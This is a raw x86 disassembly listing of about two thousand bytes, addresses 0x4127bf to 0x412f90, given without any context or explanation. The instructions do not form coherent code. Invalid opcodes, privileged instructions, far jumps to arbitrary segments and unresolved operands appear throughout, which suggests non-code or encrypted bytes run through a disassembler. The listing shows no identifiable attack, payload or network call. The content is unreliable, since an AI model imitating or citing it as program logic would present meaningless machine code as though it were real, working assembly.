  4127bf:	cmp    eax,0x15f90588
  4127c4:	(bad)  
  4127c5:	je     0x412784
  4127c7:	mov    ecx,0x3fe6effb
  4127cc:	test   al,0x2d
  4127ce:	dec    edx
  4127cf:	push   ecx
  4127d0:	sbb    al,0x85
  4127d2:	sbb    ah,BYTE PTR [esi-0x1d0b772f]
  4127d8:	mov    al,ds:0xe0b69601
  4127dd:	mov    ?,WORD PTR [edx+0x2d]
  4127e0:	inc    ebx
  4127e1:	data16 hlt 
  4127e3:	sub    BYTE PTR es:[edi+0x33],dl
  4127e7:	outs   dx,BYTE PTR ds:[esi]
  4127e8:	mov    al,ds:0xbac855d4
  4127ed:	adc    al,0x60
  4127ef:	daa    
  4127f0:	test   eax,0x81859618
  4127f5:	lahf   
  4127f6:	or     ebx,0x5e6df802
  4127fc:	(bad)  
  4127fd:	imul   eax,DWORD PTR [edi],0xf1fe0be8
  412803:	mov    DWORD PTR [ebp-0x4f],esi
  412806:	push   ds
  412807:	(bad)  
  412808:	div    cl
  41280a:	retf   0xdf5d
  41280d:	lea    ebp,[edi]
  41280f:	dec    ebp
  412810:	test   eax,0x7c879636
  412815:	jle    0x4127dd
  412817:	outs   dx,BYTE PTR ds:[esi]
  412818:	add    BYTE PTR [ebx],al
  41281a:	rcr    dl,0x3a
  41281d:	mov    ebx,0xfacc3bf5
  412822:	add    ecx,DWORD PTR [edx+0x37679f9f]
  412828:	dec    ecx
  412829:	and    al,0x44
  41282b:	mov    al,ds:0x9368d9e5
  412830:	cmp    eax,0x3ab0df0c
  412835:	lods   al,BYTE PTR ds:[esi]
  412836:	xchg   esp,eax
  412837:	or     BYTE PTR [ebp-0x31],ch
  41283a:	add    eax,eax
  41283c:	mov    BYTE PTR [edi],cl
  41283e:	in     eax,0xde
  412840:	lock xchg ebx,eax
  412842:	enter  0x276d,0x16
  412846:	pop    eax
  412847:	push   0x22
  412849:	sub    eax,0x985ca947
  41284e:	(bad)  
  41284f:	dec    ebx
  412850:	aaa    
  412851:	pop    eax
  412852:	cmc    
  412853:	mov    ss,edi
  412855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412856:	dec    edi
  412857:	pop    ss
  412858:	test   bl,0x22
  41285b:	adc    ah,BYTE PTR [eax+ebx*1+0x658ef2e9]
  412862:	cmp    edi,DWORD PTR [eax-0x14448a7e]
  412868:	loope  0x4127fb
  41286a:	push   ebx
  41286b:	retf   
  41286c:	sub    bl,al
  41286e:	outs   dx,DWORD PTR ds:[esi]
  41286f:	push   ds
  412870:	rcl    DWORD PTR ds:0x1e3ea074,1
  412876:	popa   
  412877:	in     eax,0xaa
  412879:	and    eax,DWORD PTR [edx+0x37]
  41287c:	mov    bh,0xa3
  41287e:	ins    BYTE PTR es:[edi],dx
  41287f:	xchg   esp,eax
  412880:	sbb    bl,BYTE PTR ds:0x539645a4
  412886:	loope  0x412823
  412888:	(bad)  
  412889:	out    dx,eax
  41288a:	push   esi
  41288b:	(bad)  
  41288c:	faddp  st(7),st
  41288e:	jecxz  0x4128f4
  412890:	test   DWORD PTR [edi+0x5f],0x48fbcd4e
  412897:	into   
  412898:	dec    ecx
  412899:	aam    0xa2
  41289b:	mov    edi,cs
  41289d:	and    eax,DWORD PTR [esi]
  41289f:	loopne 0x412916
  4128a1:	sub    BYTE PTR [ebx],ah
  4128a3:	dec    ecx
  4128a4:	mov    eax,ds:0x50c6f7a0
  4128a9:	sbb    ch,dl
  4128ab:	mov    ecx,0x9b9b782b
  4128b0:	ins    DWORD PTR es:[edi],dx
  4128b1:	inc    esi
  4128b2:	les    edi,FWORD PTR [ecx-0x5524fa39]
  4128b8:	xchg   ebx,eax
  4128b9:	jl     0x412855
  4128bb:	sbb    eax,ebp
  4128bd:	fs pushf 
  4128bf:	push   ds
  4128c0:	mov    ?,WORD PTR [eax]
  4128c2:	sti    
  4128c3:	gs mov esi,0x55ff89af
  4128c9:	mov    bh,0x78
  4128cb:	xchg   edi,eax
  4128cc:	rsm    
  4128ce:	inc    ecx
  4128cf:	mov    dl,ah
  4128d1:	inc    ebp
  4128d2:	call   0xa4e4:0xc4e7f7c
  4128d9:	popa   
  4128da:	add    al,BYTE PTR [ecx+esi*2-0x3b]
  4128de:	sub    al,0xd8
  4128e0:	dec    esp
  4128e1:	(bad)
  4128e6:	mov    ecx,0x7a3ac9f8
  4128eb:	imul   ebp,DWORD PTR [ecx+ebp*1],0x451be8aa
  4128f2:	pop    edi
  4128f3:	sbb    ebx,DWORD PTR [eax]
  4128f5:	data16 in al,0xbe
  4128f8:	test   al,0xd
  4128fa:	adc    eax,0x93cda9b8
  4128ff:	into   
  412900:	sub    ah,BYTE PTR [edi-0x50d90bfc]
  412906:	ja     0x4128c7
  412908:	push   ss
  412909:	xchg   BYTE PTR [esi],dl
  41290b:	xchg   BYTE PTR [eax+eax*4+0x1317f564],ch
  412912:	xlat   BYTE PTR ds:[ebx]
  412913:	sub    al,BYTE PTR [edx+ebp*4-0x57282e3f]
  41291a:	ficomp WORD PTR [ecx-0x25]
  41291d:	push   0x4cddd5fa
  412922:	mov    esp,0x4ad8037a
  412927:	lds    esi,FWORD PTR [ebx-0x3c085a94]
  41292d:	jle    0x41293f
  41292f:	pusha  
  412930:	mov    esp,0x7b8c506
  412935:	or     BYTE PTR [edi+0x370cdf80],bl
  41293b:	lds    esi,FWORD PTR [ecx-0x7adbb77e]
  412941:	aas    
  412942:	dec    ebp
  412943:	fs cmp ebp,ebp
  412946:	outs   dx,BYTE PTR ds:[esi]
  412947:	sti    
  412948:	rcl    DWORD PTR [edi],cl
  41294a:	stc    
  41294b:	repz cmc 
  41294d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41294e:	xchg   ecx,eax
  41294f:	and    dl,BYTE PTR [edi+0x37c6d235]
  412955:	xchg   edi,eax
  412956:	retf   0x242a
  412959:	add    ch,BYTE PTR [edx]
  41295b:	and    al,0x6e
  41295d:	ret    0x33bf
  412960:	jne    0x41290d
  412962:	repz or DWORD PTR [ebp+0x3f01448e],esi
  412969:	cmp    edx,esp
  41296b:	ss call 0xc9d8:0x4ad88d54
  412973:	sahf   
  412974:	mov    esi,DWORD PTR [ebx+0x5]
  412977:	ins    DWORD PTR es:[edi],dx
  412978:	dec    eax
  412979:	mov    ebp,0x60cce1c3
  41297e:	xchg   DWORD PTR [ebx],ecx
  412980:	icebp  
  412981:	outs   dx,DWORD PTR ds:[esi]
  412982:	pop    eax
  412983:	lods   al,BYTE PTR ds:[esi]
  412984:	mov    dl,0x64
  412986:	pushf  
  412987:	and    DWORD PTR [ebx-0x4ae6e1d],ebp
  41298d:	test   eax,0xc5be1f0e
  412992:	out    dx,al
  412993:	test   BYTE PTR [esi+ebx*1+0x17a89fe],dh
  41299a:	repz mov cl,0x4a
  41299d:	aam    0xcb
  41299f:	sub    ebx,DWORD PTR [edi]
  4129a1:	stos   BYTE PTR es:[edi],al
  4129a2:	in     al,0xc9
  4129a4:	imul   esp,DWORD PTR [ebp+0x3],0x41670d65
  4129ab:	mov    esp,0x2895a15e
  4129b0:	loope  0x412972
  4129b2:	jno    0x412a0e
  4129b4:	add    eax,0x1021354f
  4129b9:	cs jmp 0x65be:0x6cabaa62
  4129c1:	cwde   
  4129c2:	dec    ecx
  4129c3:	sub    DWORD PTR [esi],eax
  4129c5:	sti    
  4129c6:	leave  
  4129c7:	and    edx,DWORD PTR [ebp+0x208dbc5f]
  4129cd:	(bad)  
  4129ce:	push   edx
  4129cf:	or     eax,0x8e09ef07
  4129d4:	or     al,0x6
  4129d6:	test   al,0x5d
  4129d8:	lds    esi,FWORD PTR [ebx-0x5bfe3d5b]
  4129de:	out    0x88,al
  4129e0:	fnstsw WORD PTR [ecx]
  4129e2:	bound  edx,QWORD PTR [eax-0x173533ee]
  4129e8:	or     ebx,edx
  4129ea:	xchg   edx,eax
  4129eb:	addr16 (bad) 
  4129ed:	aam    0x50
  4129ef:	(bad)  
  4129f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129f1:	xor    BYTE PTR [edi+0x382bdf8d],0x64
  4129f8:	or     al,0x77
  4129fa:	stos   DWORD PTR es:[edi],eax
  4129fb:	imul   esp,DWORD PTR [ebx+0x1a],0xffffff90
  4129ff:	stos   BYTE PTR es:[edi],al
  412a00:	jne    0x412a7c
  412a02:	iret   
  412a03:	call   0xe006994a
  412a08:	into   
  412a09:	sub    al,0x52
  412a0b:	mov    eax,ds:0x1b87516c
  412a10:	add    eax,0xb24fa75b
  412a15:	or     DWORD PTR [ebx+0x62],esp
  412a18:	jne    0x412a1c
  412a1a:	adc    BYTE PTR [esi+edx*4-0x5f],dl
  412a1e:	dec    edx
  412a1f:	ds push ds
  412a21:	in     eax,dx
  412a22:	scas   eax,DWORD PTR es:[edi]
  412a23:	sbb    ch,0x98
  412a26:	rol    ah,cl
  412a28:	mov    dl,0xb3
  412a2a:	push   eax
  412a2b:	cmp    DWORD PTR [edx],ebp
  412a2d:	repnz push 0x6e
  412a30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a31:	retf   
  412a32:	sub    dl,dl
  412a34:	fwait
  412a35:	scas   al,BYTE PTR es:[edi]
  412a36:	sbb    al,0x22
  412a38:	test   eax,0xa21636aa
  412a3d:	inc    ebx
  412a3e:	xchg   edi,eax
  412a3f:	xchg   DWORD PTR [eax],edi
  412a41:	mov    edi,fs
  412a43:	mov    al,ds:0x29599ac6
  412a48:	lea    eax,[edi]
  412a4a:	mov    WORD PTR [ebx],gs
  412a4c:	mov    edi,0x5565756e
  412a51:	retf   
  412a52:	std    
  412a53:	pop    ebp
  412a54:	ds inc ebx
  412a56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a57:	int3   
  412a58:	xor    al,0xf7
  412a5a:	dec    eax
  412a5b:	sbb    bh,0xb
  412a5e:	mov    eax,ds:0x6b6b14af
  412a63:	sub    bl,BYTE PTR [esi+0x542b410a]
  412a69:	mov    ch,0xdb
  412a6b:	test   BYTE PTR [ebp-0x1b],dl
  412a6e:	mov    bl,BYTE PTR [ebx]
  412a70:	xor    eax,0x5956de5e
  412a75:	dec    ecx
  412a76:	lahf   
  412a77:	cmp    DWORD PTR [ebx],esp
  412a79:	push   ecx
  412a7a:	pop    esi
  412a7b:	or     al,0xa8
  412a7d:	test   al,0x5f
  412a7f:	je     0x412aa4
  412a81:	call   0xca35:0x2ab42658
  412a88:	dec    ecx
  412a89:	cs test ebx,edi
  412a8c:	dec    ebp
  412a8d:	lods   eax,DWORD PTR ds:[esi]
  412a8e:	es push esp
  412a90:	mov    esp,0x264d83c6
  412a95:	and    al,0x57
  412a97:	xor    DWORD PTR [esi+ebp*8],eax
  412a9a:	inc    esp
  412a9b:	mov    ch,0xd9
  412a9d:	or     DWORD PTR [esi-0x4f],eax
  412aa0:	enter  0x32e9,0x61
  412aa4:	adc    ah,BYTE PTR [ebp-0x80]
  412aa7:	push   esi
  412aa8:	fistp  DWORD PTR [edx+eiz*2]
  412aab:	dec    ebp
  412aac:	call   0x7d762db9
  412ab1:	jne    0x412a40
  412ab3:	add    al,0x3b
  412ab5:	mov    ebp,DWORD PTR [esi]
  412ab7:	enter  0x2794,0xc9
  412abb:	xor    al,0xd
  412abd:	mov    ebp,0x4aa92d03
  412ac2:	mov    esp,0x3022aa84
  412ac7:	int    0xa7
  412ac9:	jmp    0x3719:0x10b8f99
  412ad0:	mov    cl,0x3a
  412ad2:	pushf  
  412ad3:	popa   
  412ad4:	jae    0x412a85
  412ad6:	out    dx,al
  412ad7:	(bad)  
  412ad8:	loopne 0x412a7c
  412ada:	(bad)  
  412adb:	or     ah,BYTE PTR [ebx-0x7a]
  412ade:	or     esp,DWORD PTR [edi]
  412ae0:	repz push 0xb27c0a1d
  412ae6:	aad    0x87
  412ae8:	loope  0x412ab0
  412aea:	scas   al,BYTE PTR es:[edi]
  412aeb:	add    dl,BYTE PTR [edi+0x6646edc2]
  412af1:	ffree  st(7)
  412af3:	sbb    DWORD PTR [ecx+0x60806bb5],ebp
  412af9:	ds gs loop 0x412ab8
  412afd:	sti    
  412afe:	retf   
  412aff:	stc    
  412b00:	or     BYTE PTR [eax],al
  412b02:	cmc    
  412b03:	aam    0x57
  412b05:	xchg   DWORD PTR ds:0x83eb486c,esp
  412b0b:	enter  0xf71b,0xb5
  412b0f:	out    0x1c,al
  412b11:	xchg   ecx,eax
  412b12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b13:	pop    ebp
  412b14:	popa   
  412b15:	inc    esp
  412b16:	out    0x82,al
  412b18:	cdq    
  412b19:	sbb    al,BYTE PTR [edi]
  412b1b:	rcr    dl,0xa0
  412b1e:	inc    ebp
  412b1f:	sar    BYTE PTR [edi+0x711aa491],1
  412b25:	adc    DWORD PTR [esi+0x18cf35a5],0x9bdd63ff
  412b2f:	dec    edx
  412b30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b31:	ja     0x412b71
  412b33:	shl    DWORD PTR ds:0x8ab5a80e,1
  412b39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b3a:	fucom  st(7)
  412b3c:	mov    dh,0xc8
  412b3e:	imul   ebx,DWORD PTR [eax+0x1af1de7a],0x47
  412b45:	mov    ?,WORD PTR [eax]
  412b47:	(bad)  
  412b48:	adc    eax,0x30bc5c9b
  412b4d:	or     bh,bh
  412b4f:	and    DWORD PTR [ebp+0x7c5f3403],0xad03fc89
  412b59:	ficom  WORD PTR ds:0xc1b26c86
  412b5f:	shr    cl,cl
  412b61:	mov    cl,0x82
  412b63:	dec    esp
  412b64:	dec    ebp
  412b65:	dec    ebp
  412b66:	jnp    0x412aff
  412b68:	sbb    eax,0xfdfc2dc3
  412b6d:	fistp  QWORD PTR [ebp-0x24]
  412b70:	add    al,0x86
  412b72:	and    dl,BYTE PTR [edi]
  412b74:	fwait
  412b75:	and    BYTE PTR [eax+0x6dc9bf8e],ah
  412b7b:	ficomp DWORD PTR [esi]
  412b7d:	xchg   ebx,eax
  412b7e:	pop    esi
  412b7f:	or     cl,ch
  412b81:	pushf  
  412b82:	and    BYTE PTR [eax],ch
  412b84:	add    ah,BYTE PTR [ecx]
  412b86:	xor    bh,ah
  412b88:	xor    BYTE PTR [esi],0xa8
  412b8b:	and    edi,edx
  412b8d:	mov    edi,0xc448e62b
  412b92:	retf   0x4cd6
  412b95:	dec    ebx
  412b96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b97:	dec    esi
  412b98:	lahf   
  412b99:	ja     0x412c16
  412b9b:	sub    edx,edi
  412b9d:	xchg   DWORD PTR [edi-0x5f36b499],ebx
  412ba3:	push   0xffffffab
  412ba5:	sbb    esp,edx
  412ba7:	pushf  
  412ba8:	add    BYTE PTR [ebx-0x45],ah
  412bab:	or     DWORD PTR [edx-0x3],0xd43d425d
  412bb2:	aas    
  412bb3:	xchg   ecx,eax
  412bb4:	dec    edi
  412bb5:	in     eax,dx
  412bb6:	cmp    BYTE PTR [ebp+0x46],0x25
  412bba:	out    dx,eax
  412bbb:	push   edi
  412bbc:	mov    ds:0xb845d106,al
  412bc1:	lods   al,BYTE PTR ds:[esi]
  412bc2:	jne    0x412b8e
  412bc4:	sti    
  412bc5:	or     eax,0x4b71c6cc
  412bca:	push   edx
  412bcb:	pop    edi
  412bcc:	xlat   BYTE PTR ds:[ebx]
  412bcd:	ins    DWORD PTR es:[edi],dx
  412bce:	pusha  
  412bcf:	pop    ebp
  412bd0:	add    al,0xd1
  412bd2:	imul   ecx,DWORD PTR [ecx+0x73],0xc78adb94
  412bd9:	cmc    
  412bda:	mov    edx,eax
  412bdc:	push   ecx
  412bdd:	pop    ebx
  412bde:	retf   
  412bdf:	scas   al,BYTE PTR es:[edi]
  412be0:	inc    edi
  412be1:	jns    0x412c10
  412be3:	ret    0x2d95
  412be6:	retf   0xb0d
  412be9:	pushf  
  412bea:	lods   eax,DWORD PTR ds:[esi]
  412beb:	and    edi,DWORD PTR [eax+0x1a]
  412bee:	pop    ss
  412bef:	xchg   ebp,eax
  412bf0:	enter  0xdabe,0x5c
  412bf4:	in     eax,dx
  412bf5:	inc    edi
  412bf6:	inc    ecx
  412bf7:	adc    eax,0xbb1f5cfc
  412bfc:	xchg   esp,eax
  412bfd:	out    dx,eax
  412bfe:	enter  0xdce9,0xa6
  412c02:	jp     0x412c1c
  412c04:	aas    
  412c05:	ror    ch,0x9f
  412c08:	xchg   edx,eax
  412c09:	fbstp  TBYTE PTR [eax+0xdb7f09e]
  412c0f:	jae    0x412c4d
  412c11:	cmp    edi,DWORD PTR [edi-0x80]
  412c14:	xor    eax,0x8521e61b
  412c19:	mov    ds:0xdd2e6eba,al
  412c1e:	cmp    al,0x37
  412c20:	sub    DWORD PTR [esi-0x517996ff],edx
  412c26:	cs cli 
  412c28:	ret    
  412c29:	scas   eax,DWORD PTR es:[edi]
  412c2a:	inc    edx
  412c2b:	das    
  412c2c:	or     BYTE PTR [edx-0x65a69ae8],cl
  412c32:	and    cl,BYTE PTR [esp+ecx*8+0x1b]
  412c36:	bndstx [edi],bnd0
  412c39:	mov    ds:0x4702640e,eax
  412c3e:	fmul   QWORD PTR [eax-0x47a84f64]
  412c44:	loop   0x412be0
  412c46:	sub    ecx,ebx
  412c48:	mov    ?,WORD PTR es:[ebx]
  412c4b:	shl    BYTE PTR [esi*2-0x6b74d14b],1
  412c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c53:	ret    0xf1e0
  412c56:	fisubr DWORD PTR ds:0x7e2f7cfe
  412c5c:	std    
  412c5d:	sbb    ecx,DWORD PTR [eax+0x59]
  412c60:	sti    
  412c61:	jnp    0x412c1c
  412c63:	sbb    eax,0x4697d1ca
  412c68:	scas   eax,DWORD PTR es:[edi]
  412c69:	adc    BYTE PTR [edi+0x35],dh
  412c6c:	xchg   edi,eax
  412c6d:	retf   0x561a
  412c70:	xchg   BYTE PTR [edx+0x6c727cd],al
  412c76:	mov    eax,0x61d93709
  412c7b:	sti    
  412c7c:	mov    al,ds:0x9b5ce15d
  412c81:	push   edi
  412c82:	mov    edi,0x8a120048
  412c87:	repnz cmp BYTE PTR [edi+0x3e3b9614],bl
  412c8e:	or     BYTE PTR [eax],0xa7
  412c91:	push   ss
  412c92:	aad    0xd1
  412c94:	adc    BYTE PTR [ebp-0x7c8529f7],cl
  412c9a:	sahf   
  412c9b:	sbb    al,BYTE PTR [edi-0x46b0978c]
  412ca1:	call   DWORD PTR [esi+0x263cd96d]
  412ca7:	xor    ch,BYTE PTR [edx]
  412ca9:	gs mov ebp,esi
  412cac:	cli    
  412cad:	inc    esi
  412cae:	push   ss
  412caf:	jg     0x412cf2
  412cb1:	mov    ds:0xbda2631e,al
  412cb6:	jg     0x412cd0
  412cb8:	imul   esi,esi,0x7f
  412cbb:	enter  0xe0fe,0xeb
  412cbf:	rcl    dl,cl
  412cc1:	jno    0x412d21
  412cc3:	push   edi
  412cc4:	fild   WORD PTR [eax+ebx*8]
  412cc7:	(bad)  
  412cc8:	loope  0x412c58
  412cca:	xchg   DWORD PTR [edx],ebx
  412ccc:	call   0xdaed:0x6f41995b
  412cd3:	out    0x9,eax
  412cd5:	jo     0x412cfa
  412cd7:	mov    edx,0xd2f4f4ac
  412cdc:	dec    edi
  412cdd:	cmp    DWORD PTR [ebx-0x38],ebx
  412ce0:	aam    0xb0
  412ce2:	mov    edx,0xe7fe309b
  412ce7:	repz push ds
  412ce9:	adc    edi,esp
  412ceb:	jge    0x412c91
  412ced:	mov    ecx,0xbbf25b6e
  412cf2:	add    BYTE PTR ds:0xd39ec18c,ah
  412cf8:	ret    0x4c68
  412cfb:	es adc eax,0xecac4c86
  412d01:	push   es
  412d02:	inc    ecx
  412d03:	gs shl esi,0xfa
  412d07:	je     0x412c8a
  412d09:	inc    esp
  412d0a:	jp     0x412cd6
  412d0c:	dec    edi
  412d0d:	jl     0x412d50
  412d0f:	and    eax,0x82a212a2
  412d14:	jmp    0xd8eb1bb
  412d19:	push   0xb900f581
  412d1e:	pop    eax
  412d1f:	mov    ss,ebp
  412d21:	ret    0xb46d
  412d24:	iret   
  412d25:	sub    eax,0x7679e698
  412d2a:	pop    edi
  412d2b:	out    dx,eax
  412d2c:	fmul   st(0),st
  412d2e:	sbb    BYTE PTR [ebp+0x43],dl
  412d31:	stos   DWORD PTR es:[edi],eax
  412d32:	inc    ebx
  412d33:	cmc    
  412d34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d35:	int3   
  412d36:	jge    0x412d1d
  412d38:	jnp    0x412d24
  412d3a:	fcmovb st,st(2)
  412d3c:	popa   
  412d3d:	popf   
  412d3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d3f:	lods   al,BYTE PTR ds:[esi]
  412d40:	das    
  412d41:	ficomp DWORD PTR [eax]
  412d43:	gs aad 0xf9
  412d46:	rcr    DWORD PTR [edi+0x6453aa25],cl
  412d4c:	std    
  412d4d:	pop    eax
  412d4e:	icebp  
  412d4f:	nop
  412d50:	aaa    
  412d51:	pop    ds
  412d52:	jae    0x412d58
  412d54:	(bad)  
  412d56:	jg     0x412d36
  412d58:	pop    ebp
  412d59:	pop    ss
  412d5a:	xlat   BYTE PTR ds:[ebx]
  412d5b:	adc    bl,dh
  412d5d:	loopne 0x412d12
  412d5f:	add    DWORD PTR [edx-0x65457ad1],0x4f5f4107
  412d69:	dec    ebx
  412d6a:	add    al,0x6f
  412d6c:	loopne 0x412d95
  412d6e:	add    al,0x18
  412d70:	xor    eax,0xcc823317
  412d75:	ret    
  412d76:	sbb    esi,esp
  412d78:	nop
  412d79:	lds    ecx,FWORD PTR [eax]
  412d7b:	test   BYTE PTR [ebx],bh
  412d7d:	ins    BYTE PTR es:[edi],dx
  412d7e:	and    eax,0x35069de4
  412d83:	pop    ebx
  412d84:	inc    ebx
  412d85:	add    al,0x61
  412d87:	fs ins BYTE PTR es:[edi],dx
  412d89:	lods   al,BYTE PTR ds:[esi]
  412d8a:	out    0x3d,eax
  412d8c:	jl     0x412d8b
  412d8e:	sahf   
  412d8f:	(bad)  
  412d90:	repnz shl BYTE PTR [esi+0x5],1
  412d94:	out    0x12,al
  412d96:	push   edx
  412d97:	pop    esi
  412d98:	es inc esp
  412d9a:	jns    0x412dbc
  412d9c:	adc    BYTE PTR ds:[edi-0xd],al
  412da0:	fsubr  QWORD PTR [edx-0x5dfb73ee]
  412da6:	mov    bh,0x8c
  412da8:	bsr    edx,DWORD PTR es:[eax+ebx*8]
  412dad:	mov    ecx,0xe34a4902
  412db2:	ja     0x412d82
  412db4:	xchg   esp,eax
  412db5:	dec    eax
  412db6:	fdivr  DWORD PTR [edx-0x55]
  412db9:	mov    DWORD PTR [ecx-0x7a],esp
  412dbc:	xor    eax,0xe0898c2c
  412dc1:	dec    eax
  412dc2:	mov    eax,0xe56f6f70
  412dc7:	pushf  
  412dc8:	push   ds
  412dc9:	sub    dl,BYTE PTR [ebp-0x79e3116b]
  412dcf:	dec    esi
  412dd0:	mov    bl,bh
  412dd2:	call   0x7691:0x25bb4d97
  412dd9:	imul   esp,DWORD PTR [esi],0xffffffd3
  412ddc:	inc    ebx
  412ddd:	mov    esp,0x402c283
  412de2:	push   ebx
  412de3:	sub    esi,ebp
  412de5:	mov    edx,0x28f28507
  412dea:	push   ss
  412deb:	sub    al,0x6b
  412ded:	ret    
  412dee:	push   esp
  412def:	(bad)  
  412df0:	mov    ebx,0x51cda562
  412df5:	dec    eax
  412df6:	jge    0x412e4b
  412df8:	fadd   QWORD PTR [ecx+0x28]
  412dfb:	iret   
  412dfc:	mov    ebx,0xe3c5c55a
  412e01:	cmp    edx,ebx
  412e03:	int3   
  412e04:	push   ss
  412e05:	inc    ecx
  412e06:	(bad)  
  412e08:	cs pop ecx
  412e0a:	arpl   WORD PTR [edx-0x2c86b24d],bx
  412e10:	and    BYTE PTR [edi+0x15],cl
  412e13:	(bad)  
  412e14:	stos   DWORD PTR es:[edi],eax
  412e15:	jmp    0xe7be:0xd9156aef
  412e1c:	sbb    ebp,DWORD PTR [edi-0x70d5d1e7]
  412e22:	out    0xb6,al
  412e24:	cs mov ecx,0xb74c1511
  412e2a:	jg     0x412e07
  412e2c:	in     al,0x73
  412e2e:	pop    edi
  412e2f:	sti    
  412e30:	cmp    esi,DWORD PTR [eax]
  412e32:	mov    ecx,DWORD PTR [edx-0x54]
  412e35:	dec    ecx
  412e36:	mov    ds:0x668e1440,eax
  412e3b:	push   es
  412e3c:	fidiv  DWORD PTR [eax]
  412e3e:	mov    dh,0xfd
  412e40:	and    dl,BYTE PTR ds:0x9512e0ca
  412e46:	cwde   
  412e47:	cwde   
  412e48:	and    BYTE PTR [ecx+0x62f6207a],cl
  412e4e:	rcl    DWORD PTR [edx+0x1],0xbb
  412e52:	shl    DWORD PTR [ecx],1
  412e54:	js     0x412e02
  412e56:	aas    
  412e57:	adc    al,BYTE PTR [esi-0x520c5345]
  412e5d:	xchg   ebx,eax
  412e5e:	adc    BYTE PTR [ecx+eiz*1-0x55e723c5],0x52
  412e66:	pop    ebp
  412e67:	call   0x7640:0xacf060aa
  412e6e:	test   al,al
  412e70:	push   ds
  412e71:	jbe    0x412ea7
  412e73:	sub    esp,ecx
  412e75:	outs   dx,DWORD PTR ds:[esi]
  412e76:	ins    DWORD PTR es:[edi],dx
  412e77:	mov    al,0x74
  412e79:	dec    ecx
  412e7a:	push   edi
  412e7b:	scas   eax,DWORD PTR es:[edi]
  412e7c:	mov    es,WORD PTR [edi+eiz*1+0x254bd0c8]
  412e83:	push   ecx
  412e84:	outs   dx,DWORD PTR ds:[esi]
  412e85:	jae    0x412e90
  412e87:	jmp    0x491681fe
  412e8c:	add    al,0x8d
  412e8e:	ret    
  412e8f:	cld    
  412e90:	das    
  412e91:	pop    es
  412e92:	mov    cl,BYTE PTR [edi-0x6f]
  412e95:	mov    bl,BYTE PTR [edx]
  412e97:	xchg   edi,eax
  412e98:	lods   al,BYTE PTR ds:[esi]
  412e99:	add    DWORD PTR [ecx],ebx
  412e9b:	pop    eax
  412e9c:	dec    eax
  412e9d:	dec    ecx
  412e9e:	ret    
  412e9f:	mov    bh,BYTE PTR [eax-0x2c5ff6db]
  412ea5:	pop    esi
  412ea6:	test   al,0xc3
  412ea8:	scas   eax,DWORD PTR es:[edi]
  412ea9:	pusha  
  412eaa:	sub    DWORD PTR [ebp+0x23f2279c],edx
  412eb0:	mov    ds:0x102e28d6,eax
  412eb5:	dec    eax
  412eb6:	ss push ebp
  412eb8:	mov    ds:0x5bea05d2,eax
  412ebd:	pop    esi
  412ebe:	push   ebp
  412ebf:	fild   QWORD PTR [eax+0x626d1a12]
  412ec5:	int    0xf1
  412ec7:	test   eax,0xc04e733
  412ecc:	pop    esi
  412ecd:	fidiv  WORD PTR [ecx+edi*8]
  412ed0:	jmp    0x412e5d
  412ed2:	pop    esp
  412ed3:	add    eax,DWORD PTR [eax-0x2a6977a8]
  412ed9:	add    eax,0xe0e209c7
  412ede:	out    dx,al
  412edf:	mov    ah,ch
  412ee1:	loope  0x412f3a
  412ee3:	fisubr DWORD PTR [eax+0x30]
  412ee6:	call   0xf50deef4
  412eeb:	push   ebp
  412eec:	leave  
  412eed:	jno    0x412efb
  412eef:	stc    
  412ef0:	ds into 
  412ef2:	nop
  412ef3:	sbb    DWORD PTR [edi],edx
  412ef5:	pusha  
  412ef6:	add    bh,cl
  412ef8:	inc    edi
  412ef9:	push   0xffffffd6
  412efb:	int3   
  412efc:	cmp    al,0x5a
  412efe:	pop    es
  412eff:	cmp    DWORD PTR [ebp+0x1f],edi
  412f02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f03:	into   
  412f04:	imul   eax,ecx,0x5c8de908
  412f0a:	sub    al,0x5f
  412f0c:	jne    0x412f48
  412f0e:	sbb    eax,DWORD PTR [ebp-0x6a]
  412f11:	pop    esp
  412f12:	bound  ebp,QWORD PTR [eax+edx*1-0x608cf215]
  412f19:	je     0x412ede
  412f1b:	sbb    al,0x37
  412f1d:	inc    edi
  412f1e:	test   DWORD PTR [edi-0x5a9925b9],0x882ec928
  412f28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f29:	mov    esp,0xa00d5238
  412f2e:	sbb    DWORD PTR [esi+0x4f],0x7
  412f32:	pop    ss
  412f33:	mov    esp,0x10421a6
  412f38:	sbb    eax,0x87751411
  412f3d:	xchg   esp,eax
  412f3e:	xor    al,0x7f
  412f40:	test   DWORD PTR [ecx+0x5100702e],ebx
  412f46:	ror    DWORD PTR [edi-0x41],cl
  412f49:	xchg   ebp,eax
  412f4a:	mov    edx,0x800cdc4f
  412f4f:	sub    al,0x43
  412f51:	mov    ecx,0xc2fa6a08
  412f56:	loopne 0x412fcd
  412f58:	stos   DWORD PTR es:[edi],eax
  412f59:	ja     0x412f22
  412f5b:	arpl   WORD PTR [edi],di
  412f5d:	adc    al,0xd
  412f5f:	shl    DWORD PTR [ebx-0x2ed70dd],1
  412f65:	aaa    
  412f66:	jge    0x412f57
  412f68:	int3   
  412f69:	or     eax,0x9cfdbd68
  412f6e:	mov    ah,0x1b
  412f70:	and    ebx,0xffffff8e
  412f73:	fisubr DWORD PTR [eax+0x63d6b24f]
  412f79:	jle    0x412f0a
  412f7b:	jb     0x412f08
  412f7d:	rcl    esp,1
  412f7f:	adc    eax,0x4fa5a00d
  412f84:	push   edx
  412f86:	dec    ebp
  412f87:	enter  0x19d4,0xb8
  412f8b:	scas   eax,DWORD PTR es:[edi]
  412f8c:	popf   
  412f8d:	stos   BYTE PTR es:[edi],al
  412f8e:	sub    al,0x90
  412f90:	ja     0x412f73
